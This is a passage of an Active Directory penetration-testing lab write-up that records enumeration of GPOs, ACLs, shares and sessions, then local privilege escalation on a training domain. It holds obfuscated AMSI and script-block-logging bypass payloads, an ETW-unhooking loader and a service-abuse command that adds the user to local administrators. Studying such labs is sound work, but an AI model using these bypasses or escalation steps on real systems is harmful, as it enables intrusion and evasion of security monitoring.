dscorepropagationdata         : {12/18/2024 7:28:44 AM, 12/18/2024 7:27:45 AM, 12/5/2024 12:47:28 PM, 11/15/2022 4:17:14 AM...}
serviceprincipalname          : {WSMAN/dcorp-ci, WSMAN/dcorp-ci.dollarcorp.moneycorp.local, TERMSRV/DCORP-CI, TERMSRV/dcorp-ci.dollarcorp.moneycorp.local...}
usncreated                    : 13944
usnchanged                    : 2149200
lastlogon                     : 3/3/2025 2:57:55 AM
badpwdcount                   : 0
cn                            : DCORP-CI
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1107
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : DCORP-CI🖥️
dnshostname                   : dcorp-ci.dollarcorp.moneycorp.local

[SNIP]
```

`(Get-DomainOU -Identity 'DevOps').distinguishedname | %{Get-DomainComputer -SearchBase $_} | select -ExpandProperty name`:
```
DCORP-CI🖥️
```

**Domain Enumeration | GPOs**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGPO`:
```
[SNIP]

flags                    : 0
displayname              : Applocker📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E1
                           4A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 1/6/2025 8:33:19 AM
versionnumber            : 15
name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
cn                       : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
usnchanged               : 303528
dscorepropagationdata    : {1/6/2025 8:33:19 AM, 12/18/2024 8:31:49 AM, 12/18/2024 8:31:01 AM, 12/18/2024 8:30:36 AM...}
objectguid               : bcf4770b-b560-468b-88cb-6beaeb6793f9
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📁
distinguishedname        : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 11/15/2022 4:21:20 AM
showinadvancedviewonly   : True
usncreated               : 45231
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

[SNIP]

flags                    : 0
displayname              : DevOps Policy📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 12/24/2024 7:09:01 AM
versionnumber            : 3
name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📑
cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged               : 296496
dscorepropagationdata    : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}📁
distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 12/18/2024 7:31:22 AM
showinadvancedviewonly   : True
usncreated               : 293100
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

[SNIP]
```

`Get-DomainGPO | select -ExpandProperty displayname`:
```
Default Domain Policy📑
Default Domain Controllers Policy📑
Applocker📑
Servers📑
Students📑
DevOps Policy📑
```

`Get-DomainGPO -Identity (Get-DomainOU -Identity 'Applocked').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)`:
```
flags                    : 0
displayname              : Applocker📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 1/6/2025 8:33:19 AM
versionnumber            : 15
name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
cn                       : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
usnchanged               : 303528
dscorepropagationdata    : {1/6/2025 8:33:19 AM, 12/18/2024 8:31:49 AM, 12/18/2024 8:31:01 AM, 12/18/2024 8:30:36 AM...}
objectguid               : bcf4770b-b560-468b-88cb-6beaeb6793f9
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📁
distinguishedname        : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 11/15/2022 4:21:20 AM
showinadvancedviewonly   : True
usncreated               : 45231
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

`Get-DomainGPO -Identity (Get-DomainOU -Identity 'DevOps').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)`:
```
flags                    : 0
displayname              : DevOps Policy📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 12/24/2024 7:09:01 AM
versionnumber            : 3
name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📑
cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged               : 296496
dscorepropagationdata    : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}📁
distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 12/18/2024 7:31:22 AM
showinadvancedviewonly   : True
usncreated               : 293100
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

`Get-DomainObjectAcl -Identity 'CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | Format-Table SecurityIdentifier,ActiveDirectoryRights`:
```
SecurityIdentifier                                                                                                            ActiveDirectoryRights
------------------                                                                                                            ---------------------
S-1-5-11                                                                                                                              ExtendedRight
S-1-5-21-719815819-3726368948-3917688648-1123                                                                                            GenericAll
S-1-5-21-719815819-3726368948-3917688648-1123                                                              ListChildren, ReadProperty, GenericWrite
S-1-5-21-335606122-960912869-3279953914-519   CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
S-1-5-21-719815819-3726368948-3917688648-512  CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
S-1-5-9                                                                                                                                 GenericRead
S-1-5-11                                                                                                                                GenericRead
S-1-5-18                                      CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
S-1-3-0                                       CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
```

`notepad FindInterestingRightsGPODevOps.ps1`:
```powershell
Get-DomainObjectAcl -Identity (Get-DomainOU -Identity 'DevOps').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72) -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteDACL|GenericAll|WriteOwner" } |
ForEach-Object {
    $sam = ConvertFrom-SID $_.SecurityIdentifier
    [PSCustomObject]@{
        SamAccountName       = $sam
        ActiveDirectoryRights = $_.ActiveDirectoryRights
    }
} | Format-Table SamAccountName, ActiveDirectoryRights
```

`./FindInterestingRightsGPODevOps.ps1`:
```
SamAccountName                                                                                          ActiveDirectoryRights
--------------                                                                                          ---------------------
dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
dcorp\devopsadmin👤     CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl📌, WriteOwner
mcorp\Enterprise Admins CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
Local System            CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
Creator Owner           CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
```

#### Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter)

**Domain Enumeration | Shares**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerHuntShares.psm1`

`type C:\AD\Tools\servers.txt`:
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadmin.dollarcorp.moneycorp.local
```

`notepad C:\AD\Tools\servers.txt`:
```
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadmin.dollarcorp.moneycorp.local
```

`Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
```
[SNIP]

 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][02/20/2025 06:31] Scan Start
 [*][02/20/2025 06:31] Output Directory: C:\AD\Tools\\SmbShareHunt-02202025063120
 [*][02/20/2025 06:31] Importing computer targets from C:\AD\Tools\servers.txt
 [*][02/20/2025 06:31] 7 systems will be targeted
 [*][02/20/2025 06:31] - Skipping ping scan.
 [*][02/20/2025 06:31] Checking if TCP Port 445 is open on 7 computers
 [*][02/20/2025 06:31] - 7 computers have TCP port 445 open.
 [*][02/20/2025 06:31] Getting a list of SMB shares from 7 computers
 [*][02/20/2025 06:31] - 23 SMB shares were found.
 [*][02/20/2025 06:31] Getting share permissions from 23 SMB shares
 [*][02/20/2025 06:31] - 30 share permissions were enumerated.
 [*][02/20/2025 06:31] Identifying potentially excessive share permissions
 [*][02/20/2025 06:31] - 10 potentially excessive privileges were found on 4 shares across 3 systems.
 [*][02/20/2025 06:31] Getting directory listings from 4 SMB shares
 [*][02/20/2025 06:31] - Targeting up to 3 nested directory levels
 [*][02/20/2025 06:31] - 6 files and folders were enumerated.
 [*][02/20/2025 06:31] Scan Complete

[SNIP]
 
 [*][02/20/2025 06:31] Creating ShareGraph nodes and edges...
 [*][02/20/2025 06:31] Analysis Complete
 ---------------------------------------------------------------
 SHARE REPORT SUMMARY📌
 ---------------------------------------------------------------
 [*][02/20/2025 06:31] Domain: SmbHunt
 [*][02/20/2025 06:31] Start time: 02/20/2025 06:31:20
 [*][02/20/2025 06:31] End time: 02/20/2025 06:31:45
 [*][02/20/2025 06:31] Run time: 00:00:25.1958136
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] COMPUTER SUMMARY
 [*][02/20/2025 06:31] - 7 domain computers found.
 [*][02/20/2025 06:31] - 0 (0.00%) domain computers responded to ping. (No Ping)
 [*][02/20/2025 06:31] - 7 (100.00%) domain computers had TCP port 445 accessible.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that were non-default.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares with potentially excessive privileges.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that allowed READ access.
 [*][02/20/2025 06:31] - 2 (28.57%) domain computers had shares that allowed WRITE access.
 [*][02/20/2025 06:31] - 1 (14.29%) domain computers had shares that are HIGH RISK.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] SHARE SUMMARY
 [*][02/20/2025 06:31] - 23 shares were found. We expect a minimum of 14 shares
 [*][02/20/2025 06:31]   because 7 systems had open ports and there are typically two default shares.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems were non-default.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems are configured with 10 potentially excessive ACLs.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems allowed READ access.
 [*][02/20/2025 06:31] - 2 (8.70%) shares across 2 systems allowed WRITE access.
 [*][02/20/2025 06:31] - 2 (8.70%) shares across 1 systems are considered HIGH RISK.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] SHARE ACL SUMMARY
 [*][02/20/2025 06:31] - 30 ACLs were found.
 [*][02/20/2025 06:31] - 30 (100.00%) ACLs were associated with non-default shares.
 [*][02/20/2025 06:31] - 10 (33.33%) ACLs were found to be potentially excessive.
 [*][02/20/2025 06:31] - 6 (20.00%) ACLs were found that allowed READ access.
 [*][02/20/2025 06:31] - 2 (6.67%) ACLs were found that allowed WRITE access.
 [*][02/20/2025 06:31] - 5 (16.67%) ACLs were found that are associated with HIGH RISK share names.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] - The most common share names are:
 [*][02/20/2025 06:31] - 4 of 4 (100.00%) discovered shares are associated with the top 200 share names.
 [*][02/20/2025 06:31]   - 1 AI📁
 [*][02/20/2025 06:31]   - 1 studentshareadmin
 [*][02/20/2025 06:31]   - 1 C$
 [*][02/20/2025 06:31]   - 1 ADMIN$
 [*] -----------------------------------------------
 [*][02/20/2025 06:31]   - Generating HTML Report
 [*][02/20/2025 06:31]   - Estimated generation time: 1 minute or less
 [*][02/20/2025 06:31]   - All files written to C:\AD\Tools\\SmbShareHunt-02202025063120📌
 [*][02/20/2025 06:31]   - Done.
```

`dir C:\AD\Tools\SmbShareHunt-02202025063120`:
```
    Directory: C:\AD\Tools\SmbShareHunt-02202025063120


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/20/2025   6:31 AM                Results
-a----         2/20/2025   6:31 AM        1069450 Summary-Report-SmbHunt.html📌
```

**Domain Enumeration | Local Admin Access**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess`:
```
dcorp-adminsrv🖥️
```

`winrs -r:dcorp-adminsrv cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\student422>
```
🚀

`exit`

**Domain Enumeration | Session Hunting with Invoke-SessionHunter**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`

`type C:\AD\Tools\servers.txt`:
```
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadmin.dollarcorp.moneycorp.local
```

`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:3.552

HostName          UserSession                     Access
--------          -----------                     ------
dcorp-appsrv🖥️    dcorp\appadmin👤                False
dcorp-ci🖥️        dcorp\ciadmin👤                 False
dcorp-ci🖥️        dcorp\devopsadmin👤             False
dcorp-mgmt🖥️      dcorp\mgmtadmin👤               False
dcorp-mssql🖥️     dcorp\sqladmin👤                False
dcorp-sql1🖥️      dcorp\sql1admin👤               False
dcorp-stdadmin🖥️  dcorp\studentadmin👤            False
dcorp-mgmt🖥️      dcorp\svcadmin👤                False
dcorp-mssql🖥️     dcorp\Administrator👤           False
dcorp-stdadmin🖥️  DCORP-STD422\Administrator👤    False
dcorp-adminsrv🖥️  dcorp\appadmin👤                True
dcorp-adminsrv🖥️  dcorp\srvadmin👤                True
dcorp-adminsrv🖥️  dcorp\websvc👤                  True
```

**Domain Enumeration | Session Hunting with PowerView**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`type C:\AD\Tools\sbloggingbypass.txt`:
```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

`iex (type C:\AD\Tools\sbloggingbypass.txt)`

`type C:\AD\Tools\amsibypass.txt`:
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

`iex (type C:\AD\Tools\amsibypass.txt)`

`Import-Module C:\AD\Tools\PowerView.ps1`

`Find-DomainUserLocation -ComputerName (type C:\AD\Tools\servers.txt)`:
```

```

### Local Privilege Escalation

#### Local Privilege Escalation | Feature Abuse (with PowerUp, winPEAS, PrivEscCheck)

**Local Privilege Escalation | PowerUp**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUp.ps1`

`Invoke-AllChecks`:
```
[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...📌

[SNIP]

ServiceName    : AbyssWebServer📌
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem📌
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True📌
Name           : AbyssWebServer
Check          : Unquoted Service Paths📌

[SNIP]

[*] Checking service executable and argument permissions...📌

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service📌
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone📌
StartName                       : LocalSystem📌
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'📌
CanRestart                      : True
Name                            : AbyssWebServer
Check                           : Modifiable Service Files

[SNIP]

[*] Checking service permissions...

ServiceName   : AbyssWebServer📌
Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName     : LocalSystem📌
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'📌
CanRestart    : True📌
Name          : AbyssWebServer
Check         : Modifiable Services

[SNIP]
```

`Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student422' -Verbose`:
```
VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
VERBOSE: Executing command 'net localgroup Administrators dcorp\student422 /add'
VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\student422 /add'⏫
VERBOSE: Restoring original path to service 'AbyssWebServer'
VERBOSE: binPath for AbyssWebServer successfully set to 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Leaving service 'AbyssWebServer' in stopped state

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student422 /add⏫
```

**Local Privilege Escalation | winPEAS**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`cd /AD/Tools`

`./DefenderCheck.exe .\winPEASx64.exe`:
```
Target file size: 11163648 bytes
Analyzing...

Exhausted the search. The binary looks good to go!
```

`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log`:
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\winPEASx64.exe Arguments : notcolor log
"log" argument present, redirecting output to file "out.txt"📌
```

`type out.txt`:
```
[SNIP]

════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    AbyssWebServer(Aprelium - Abyss Web Server)[C:\WebServer\Abyss Web Server\abyssws.exe -service] - Auto - Stopped - No quotes and Space detected📌
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Everyone [AllAccess]📌
    Possible DLL Hijacking in binary folder: C:\WebServer\Abyss Web Server (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])📌
[1;90m   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
[1;90m   =================================================================================================


╔══════════╣ Modifiable Services
╚ Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    AbyssWebServer: AllAccess📌
    RmSvc: GenericExecute (Start/Stop)
    SNMPTRAP: AllAccess
    ConsentUxUserSvc_21fd24: GenericExecute (Start/Stop)
    CredentialEnrollmentManagerUserSvc_21fd24: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_21fd24: GenericExecute (Start/Stop)
    DevicePickerUserSvc_21fd24: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_21fd24: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_21fd24: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_21fd24: GenericExecute (Start/Stop)
    UdkUserSvc_21fd24: GenericExecute (Start/Stop)
    UnistoreSvc_21fd24: GenericExecute (Start/Stop)
    UserDataSvc_21fd24: GenericExecute (Start/Stop)
    WpnUserService_21fd24: GenericExecute (Start/Stop)

[SNIP]
```

**Local Privilege Escalation | PrivEscCheck**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Import-Module C:\AD\Tools\PrivEscCheck.ps1`

`Invoke-PrivescCheck`:
```
[SNIP]

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Service permissions                               ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service through the Service Control Manager (SCM).         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Vulnerable - High


Name              : AbyssWebServer📌
ImagePath         : C:\WebServer\Abyss Web Server\abyssws.exe -service
User              : LocalSystem📌
AccessRights      : AllAccess📌
IdentityReference : Everyone
Status            : Stopped
UserCanStart      : True
UserCanStop       : True

Name              : SNMPTRAP📌
ImagePath         : C:\Windows\System32\snmptrap.exe
User              : LocalSystem📌
AccessRights      : AllAccess📌
IdentityReference : Everyone
Status            : Running
UserCanStart      : True
UserCanStop       : True

[SNIP]

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Service image file permissions                    ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service's binary or its folder.                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Vulnerable - High


Name              : AbyssWebServer
ImagePath         : C:\WebServer\Abyss Web Server\abyssws.exe -service📌
User              : LocalSystem
ModifiablePath    : C:\WebServer\Abyss Web Server\abyssws.exe
IdentityReference : Everyone
Permissions       : WriteOwner, Delete, WriteAttributes, Synchronize, ReadControl, ReadData, AppendData, WriteExtendedAttributes, WriteDAC, ReadAttributes,
                    WriteData, ReadExtendedAttributes, DeleteChild, Execute
Status            : Stopped
UserCanStart      : True
UserCanStop       : True

[SNIP]

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Service unquoted paths                            ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether there are services configured with an          ┃
┃ exploitable unquoted path that contains spaces.              ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Vulnerable - High


Name           : AbyssWebServer
ImagePath      : C:\WebServer\Abyss Web Server\abyssws.exe -service
User           : LocalSystem
Status         : Stopped
UserCanStart   : True📌
UserCanStop    : True
ModifiablePath : C:\WebServer
Vulnerable     : True

[SNIP]
```
🚩

#### Local Privilege Escalation | GPO Abuse (with Impacket's ntlmrelayx, GPOddity)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainGPO -Identity 'DevOps Policy'`:
```
flags                    : 0
displayname              : DevOps Policy📑
